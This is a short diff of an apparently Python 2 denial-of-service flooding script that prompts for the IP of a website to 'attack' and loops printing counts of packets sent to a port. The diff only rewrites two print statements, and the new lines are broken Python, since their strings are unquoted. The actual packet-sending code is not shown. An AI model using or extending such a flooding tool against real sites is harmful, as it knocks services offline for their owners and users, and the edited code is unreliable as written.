@@ -25,7 +25,7 @@ def logo():
 
 ip = raw_input("[+] >>IP WEBSITE YOU WANT ATTACK: ")
 os.system("clear")
-print "ATTACKING..."
+print (ATTACKING...)
 time.sleep(3)
 while True:
 	sent = 0
@@ -34,4 +34,4 @@ while True:
     		sent = sent + 1
     		print "\032[1;91mSend \032[1;32m%s \032[1;91m Packets to \032[1;32m%s \032[1;91mThrough port \032[1;32m%s "%(sent, ip, port)
 
-print "\031[1;92mDONE!\031[0m"
+print (DONE!)
